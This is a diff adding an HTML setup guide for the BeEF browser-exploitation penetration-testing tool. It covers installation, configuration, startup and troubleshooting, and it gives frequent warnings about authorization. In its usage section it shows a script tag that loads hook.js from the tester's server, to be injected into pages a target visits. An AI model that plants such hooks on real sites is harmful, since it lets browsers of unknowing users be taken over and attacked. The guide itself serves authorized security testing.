@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beef-XSS Project Setup Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 1px solid #30363d;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            color: #58a6ff;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        h2 {
+            color: #58a6ff;
+            margin: 25px 0 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #30363d;
+        }
+        
+        h3 {
+            color: #f78166;
+            margin: 20px 0 10px;
+        }
+        
+        .subtitle {
+            color: #8b949e;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+        
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .sidebar {
+            flex: 1;
+            min-width: 250px;
+            background-color: #161b22;
+            border-radius: 6px;
+            padding: 20px;
+            position: sticky;
+            top: 20px;
+            height: fit-content;
+        }
+        
+        .main-content {
+            flex: 3;
+            min-width: 300px;
+        }
+        
+        .nav-list {
+            list-style-type: none;
+        }
+        
+        .nav-list li {
+            margin-bottom: 10px;
+        }
+        
+        .nav-list a {
+            color: #58a6ff;
+            text-decoration: none;
+            display: block;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+        
+        .nav-list a:hover {
+            background-color: #1c2128;
+            text-decoration: underline;
+        }
+        
+        .card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .step {
+            counter-increment: step-counter;
+            margin-bottom: 25px;
+            padding-left: 50px;
+            position: relative;
+        }
+        
+        .step::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background-color: #238636;
+            color: white;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        pre {
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-x: auto;
+            margin: 15px 0;
+            color: #d2a8ff;
+        }
+        
+        code {
+            color: #d2a8ff;
+            background-color: #0d1117;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+        }
+        
+        .warning {
+            background-color: #3a2100;
+            border-left: 4px solid #ffa500;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        
+        .note {
+            background-color: #1c2e40;
+            border-left: 4px solid #58a6ff;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        
+        .screenshot {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .screenshot img {
+            max-width: 100%;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+        }
+        
+        .caption {
+            color: #8b949e;
+            font-style: italic;
+            margin-top: 8px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            border-top: 1px solid #30363d;
+            color: #8b949e;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .sidebar {
+                position: relative;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Beef-XSS Project Setup Guide</h1>
+        <p class="subtitle">Complete documentation for installing, configuring, and running the Browser Exploitation Framework</p>
+    </header>
+    
+    <div class="container">
+        <aside class="sidebar">
+            <h2>Navigation</h2>
+            <ul class="nav-list">
+                <li><a href="#overview">Overview</a></li>
+                <li><a href="#prerequisites">Prerequisites</a></li>
+                <li><a href="#installation">Installation Steps</a></li>
+                <li><a href="#configuration">Configuration</a></li>
+                <li><a href="#running">Running Beef-XSS</a></li>
+                <li><a href="#usage">Basic Usage</a></li>
+                <li><a href="#security">Security Considerations</a></li>
+                <li><a href="#troubleshooting">Troubleshooting</a></li>
+                <li><a href="#resources">Additional Resources</a></li>
+            </ul>
+            
+            <div class="note">
+                <h3>Quick Notes</h3>
+                <p>Beef-XSS is a powerful penetration testing tool. Use responsibly and only on systems you own or have permission to test.</p>
+            </div>
+        </aside>
+        
+        <main class="main-content">
+            <section id="overview" class="card">
+                <h2>What is Beef-XSS?</h2>
+                <p>The Browser Exploitation Framework (Beef) is a penetration testing tool that focuses on the web browser. It enables professional security analysts to assess the actual security posture of a target environment using client-side attack vectors.</p>
+                
+                <p>Beef-XSS hooks one or more web browsers and uses them as beachheads for launching directed command modules and further attacks against the system from within the browser context.</p>
+            </section>
+            
+            <section id="prerequisites" class="card">
+                <h2>Prerequisites</h2>
+                <p>Before installing Beef-XSS, ensure your system meets the following requirements:</p>
+                
+                <ul>
+                    <li>Linux-based operating system (Kali Linux recommended)</li>
+                    <li>Ruby 2.7 or newer</li>
+                    <li>Node.js and npm</li>
+                    <li>Git</li>
+                    <li>At least 2GB RAM (4GB recommended)</li>
+                    <li>5GB of free disk space</li>
+                    <li>Internet connection for downloading dependencies</li>
+                </ul>
+                
+                <div class="warning">
+                    <h3>Warning</h3>
+                    <p>Beef-XSS should only be installed on systems you own or have explicit permission to test. Unauthorized use may violate laws and regulations.</p>
+                </div>
+            </section>
+            
+            <section id="installation" class="card">
+                <h2>Installation Steps</h2>
+                
+                <div class="step">
+                    <h3>Step 1: Update System Packages</h3>
+                    <p>Start by updating your package repository and upgrading existing packages:</p>
+                    <pre><code>sudo apt update && sudo apt upgrade -y</code></pre>
+                </div>
+                
+                <div class="step">
+                    <h3>Step 2: Install Dependencies</h3>
+                    <p>Install the required dependencies for Beef-XSS:</p>
+                    <pre><code>sudo apt install -y git ruby ruby-dev libsqlite3-dev \
+libssl-dev python3-pip nodejs npm build-essential</code></pre>
+                </div>
+                
+                <div class="step">
+                    <h3>Step 3: Clone the Repository</h3>
+                    <p>Clone the Beef-XSS repository from GitHub:</p>
+                    <pre><code>git clone https://github.com/beefproject/beef.git</code></pre>
+                    <p>Then navigate to the beef directory:</p>
+                    <pre><code>cd beef</code></pre>
+                </div>
+                
+                <div class="step">
+                    <h3>Step 4: Install Ruby Gems</h3>
+                    <p>Install the required Ruby gems using Bundler:</p>
+                    <pre><code>gem install bundler
+bundle install</code></pre>
+                    <p>This may take several minutes to complete.</p>
+                </div>
+                
+                <div class="note">
+                    <h3>Note</h3>
+                    <p>If you encounter permission errors during gem installation, you may need to use a Ruby version manager like RVM or rbenv, or install gems in a user directory.</p>
+                </div>
+            </section>
+            
+            <section id="configuration" class="card">
+                <h2>Configuration</h2>
+                
+                <div class="step">
+                    <h3>Step 5: Configure Beef-XSS</h3>
+                    <p>Edit the main configuration file according to your needs:</p>
+                    <pre><code>nano config.yaml</code></pre>
+                    
+                    <p>Key configuration options to consider:</p>
+                    <ul>
+                        <li><strong>host</strong>: IP address to bind to (0.0.0.0 for all interfaces)</li>
+                        <li><strong>port</strong>: Web UI port (default: 3000)</li>
+                        <li><strong>user</strong> and <strong>passwd</strong>: Change default credentials</li>
+                        <li><strong>permitted_hooking_subnet</strong>: Restrict which IPs can be hooked</li>
+                    </ul>
+                    
+                    <p>Example configuration snippet:</p>
+                    <pre><code>beef:
+    version: '0.5.0.0'
+    credentials:
+        user: "beef"
+        passwd: "beef"
+    restrictions:
+        permitted_hooking_subnet: ["192.168.0.0/16"]
+    http:
+        host: "0.0.0.0"
+        port: "3000"</code></pre>
+                </div>
+                
+                <div class="warning">
+                    <h3>Security Warning</h3>
+                    <p>Always change the default credentials before using Beef-XSS in any environment. The default username and password are publicly known.</p>
+                </div>
+            </section>
+            
+            <section id="running" class="card">
+                <h2>Running Beef-XSS</h2>
+                
+                <div class="step">
+                    <h3>Step 6: Start Beef-XSS</h3>
+                    <p>Launch Beef-XSS using the provided script:</p>
+                    <pre><code>./beef</code></pre>
+                    
+                    <p>Alternatively, you can run it with custom configuration:</p>
+                    <pre><code>./beef -c /path/to/your/config.yaml</code></pre>
+                    
+                    <p>You should see output similar to:</p>
+                    <pre><code>[21:45:32]    |    Beef is loading. Wait a few seconds...
+[21:45:32]    |    [*] Please wait for the BeEF service to start.
+[21:45:33]    |    |    Hook URL: http://192.168.1.100:3000/hook.js
+[21:45:33]    |    |    UI URL:   http://192.168.1.100:3000/ui/panel
+[21:45:33]    |    [*] BeEF service started successfully!</code></pre>
+                </div>
+                
+                <div class="step">
+                    <h3>Step 7: Access the Web UI</h3>
+                    <p>Open your web browser and navigate to the UI URL shown in the console (typically http://localhost:3000/ui/panel).</p>
+                    
+                    <p>Log in using the credentials you configured (default: beef/beef).</p>
+                    
+                    <div class="screenshot">
+                        <div class="caption">Beef-XSS Login Interface</div>
+                    </div>
+                </div>
+            </section>
+            
+            <section id="usage" class="card">
+                <h2>Basic Usage</h2>
+                
+                <h3>Hooking a Browser</h3>
+                <p>To hook a browser, inject the hook.js script into a webpage that your target will visit:</p>
+                <pre><code>&lt;script src="http://your-beef-ip:3000/hook.js"&gt;&lt;/script&gt;</code></pre>
+                
+                <p>When a browser loads this script, it will appear in the "Hooked Browsers" panel of the Beef UI.</p>
+                
+                <h3>Executing Modules</h3>
+                <p>Once a browser is hooked, you can execute various modules:</p>
+                <ul>
+                    <li>Browser reconnaissance</li>
+                    <li>Social engineering attacks</li>
+                    <li>Exploits against browser vulnerabilities</li>
+                    <li>Network reconnaissance</li>
+                </ul>
+                
+                <div class="note">
+                    <h3>Note</h3>
+                    <p>Be ethical and responsible. Only test systems you own or have explicit permission to test.</p>
+                </div>
+            </section>
+            
+            <section id="security" class="card">
+                <h2>Security Considerations</h2>
+                
+                <ul>
+                    <li>Never expose Beef-XSS to the public internet without proper security measures</li>
+                    <li>Change default credentials immediately after installation</li>
+                    <li>Use firewall rules to restrict access to the Beef web interface</li>
+                    <li>Regularly update Beef-XSS to get security patches</li>
+                    <li>Only use on isolated test networks when possible</li>
+                </ul>
+            </section>
+            
+            <section id="troubleshooting" class="card">
+                <h2>Troubleshooting Common Issues</h2>
+                
+                <h3>Ruby Version Issues</h3>
+                <p>If you encounter Ruby version conflicts, consider using a version manager:</p>
+                <pre><code># Using RVM
+curl -sSL https://get.rvm.io | bash -s stable
+source ~/.rvm/scripts/rvm
+rvm install ruby-2.7.0
+rvm use ruby-2.7.0</code></pre>
+                
+                <h3>Port Already in Use</h3>
+                <p>If port 3000 is already in use, either free the port or change Beef's configuration:</p>
+                <pre><code># Find process using port 3000
+lsof -i :3000
+
+# Kill the process (if appropriate)
+kill -9 [PID]
+
+# Or change Beef's port in config.yaml
+http:
+    port: "3001"</code></pre>
+                
+                <h3>Bundle Install Errors</h3>
+                <p>If bundle install fails, try:</p>
+                <pre><code>bundle clean --force
+bundle install</code></pre>
+            </section>
+            
+            <section id="resources" class="card">
+                <h2>Additional Resources</h2>
+                
+                <ul>
+                    <li>Official Beef-XSS GitHub: <a href="https://github.com/beefproject/beef" style="color: #58a6ff;">https://github.com/beefproject/beef</a></li>
+                    <li>Beef-XSS Documentation: <a href="https://github.com/beefproject/beef/wiki" style="color: #58a6ff;">https://github.com/beefproject/beef/wiki</a></li>
+                    <li>Kali Linux Tools: <a href="https://www.kali.org/tools/beef-xss/" style="color: #58a6ff;">https://www.kali.org/tools/beef-xss/</a></li>
+                    <li>OWASP Web Security Testing Guide: <a href="https://owasp.org/www-project-web-security-testing-guide/" style="color: #58a6ff;">https://owasp.org/www-project-web-security-testing-guide/</a></li>
+                </ul>
+            </section>
+        </main>
+    </div>
+    
+    <footer>
+        <p>Beef-XSS Project Documentation | Created for educational purposes only</p>
+        <p>Always practice ethical hacking and obtain proper authorization before testing</p>
+    </footer>
+</body>
+</html>
